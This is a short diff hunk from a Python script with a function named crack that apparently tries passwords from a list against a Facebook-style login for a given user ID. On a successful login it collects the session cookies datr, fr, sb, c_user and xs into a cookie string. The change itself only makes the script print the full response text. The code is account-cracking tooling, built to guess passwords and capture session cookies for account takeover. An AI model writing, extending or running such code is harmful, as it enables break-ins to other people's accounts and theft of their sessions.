@@ -212,7 +212,7 @@ def crack(uid, password_list, total_count):
             'viewport-width': '1111',}
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
-            print(respon)# Check response
+            print(respon.text)# Check response
             if "c_user" in log_cookies:
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={Session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
